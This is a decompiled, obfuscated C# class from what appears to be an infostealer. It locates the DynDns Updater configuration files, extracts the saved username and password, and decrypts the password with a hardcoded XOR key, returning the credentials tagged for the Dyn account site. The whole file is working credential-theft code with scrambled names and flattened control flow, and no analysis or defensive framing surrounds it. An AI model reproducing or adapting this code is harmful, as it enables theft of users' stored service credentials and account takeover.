using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using _81d;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class ovgKvAaO5 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string trYdM
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public ovgKvAaO5()
	{
		trYdM = "DynDns";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			ii68 ii69 = VoDIG3D();
			if (ii69 != null)
			{
				list.Add(ii69);
			}
		}
		catch
		{
		}
		return list;
	}

	private ii68 VoDIG3D()
	{
		int num = 0;
		string path = default;
		while (true)
		{
			if (num != 4)
			{
				switch (num)
				{
				case 3:
					return null;
				case 1:
					path = Path.Combine(Environment.GetEnvironmentVariable("ALLUSERSPROFILE"), "Dyn\\Updater\\config.dyndns");
					num = 2;
					break;
				}
				if (num == 2)
				{
					if (File.Exists(path))
					{
						goto IL_001f;
					}
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					break;
				}
				continue;
			}
			goto IL_001f;
			IL_001f:
			string[] array = File.ReadAllLines(path);
			ii68 ii69 = new ii68();
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (text.ToLower().Contains("username="))
				{
					ii69.S8v = text.Split(new char[1] { '=' })[1];
				}
				else if (text.ToLower().Contains("password="))
				{
					string iduiK = text.Split(new char[1] { '=' })[1];
					byte[] olP1rKj0Fe = b4v.H4VWdV77v(iduiK);
					ii69._9H5rP7hg2 = _2CssMXJ(olP1rKj0Fe);
				}
			}
			if (string.IsNullOrEmpty(ii69._9H5rP7hg2))
			{
				break;
			}
			ii69.oVAe = trYdM;
			ii69.byIdLuuGZbL = "https://account.dyn.com/";
			return ii69;
		}
		return null;
	}

	private string _2CssMXJ(byte[] OlP1rKj0Fe)
	{
		int num = 0;
		byte[] array = default;
		int num2 = default;
		string text = default;
		byte b = default;
		string text2 = default;
		int num3 = default;
		do
		{
			if (num == 4)
			{
				array = OlP1rKj0Fe;
				num = 5;
			}
			if (num == 10)
			{
				num2++;
				num = 11;
			}
			if (num == 8)
			{
				text += (char)(b ^ text2[num3]);
				num = 9;
			}
			if (num == 3)
			{
				num3 = 0;
				num = 4;
			}
			if (num == 11)
			{
				goto IL_00cb;
			}
			goto IL_00e3;
			IL_00e3:
			if (num == 5)
			{
				num2 = 0;
				num = 6;
			}
			if (num == 2)
			{
				text2 = "t6KzXhCh";
				num = 3;
			}
			if (num == 6)
			{
				goto IL_00cb;
			}
			if (num == 1)
			{
				text = "";
				num = 2;
			}
			if (num == 9)
			{
				num3 = (num3 + 1) % 8;
				num = 10;
			}
			if (num == 7)
			{
				goto IL_01aa;
			}
			goto IL_01c0;
			IL_00cb:
			if (num2 >= array.Length)
			{
				num = 12;
				goto IL_00e3;
			}
			goto IL_01aa;
			IL_01c0:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_01aa:
			b = array[num2];
			num = 8;
			goto IL_01c0;
		}
		while (num != 12);
		return text;
	}

	private List<ii68> _6o955()
	{
		int num = 0;
		string path = default;
		List<ii68> result = default;
		do
		{
			if (num == 2)
			{
				path = Path.Combine(Environment.GetEnvironmentVariable("ALLUSERSPROFILE"), "Dyn\\Updater\\daemon.cfg");
				num = 3;
			}
			if (num == 1)
			{
				result = new List<ii68>();
				num = 2;
			}
			if (num == 4)
			{
				return result;
			}
			if (num == 3)
			{
				if (File.Exists(path))
				{
					break;
				}
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		kKdeGISe kKdeGISe2 = new kKdeGISe(File.ReadAllText(path));
		string text = kKdeGISe2["global"]["accounts"];
		string[] array = text.Split(new char[1] { ',' });
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			_ = kKdeGISe2["account." + text2]["username"];
			_ = kKdeGISe2["account." + text2]["password"];
		}
		return result;
	}
}
